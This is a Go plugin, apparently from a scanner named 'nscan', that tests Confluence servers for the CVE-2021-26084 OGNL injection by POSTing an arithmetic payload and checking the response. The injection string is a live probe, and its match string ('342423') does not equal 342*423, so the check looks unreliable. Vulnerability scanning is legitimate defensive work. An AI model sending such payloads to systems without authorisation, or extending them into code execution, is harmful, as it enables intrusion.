package confluence

import (
	"fmt"
	"nscan/plugins/log"
	"strings"

	"nscan/utils"
)

func CVE_2021_26084(u string) bool {
	if req, err := utils.HttpRequset(u+"/pages/doenterpagevariables.action", "POST", "queryString=vvv\\u0027%2b#{342*423}%2b\\u0027ppp", false, nil); err == nil {
		if strings.Contains(req.Body, "342423") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found Confluence CVE_2021_26084|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
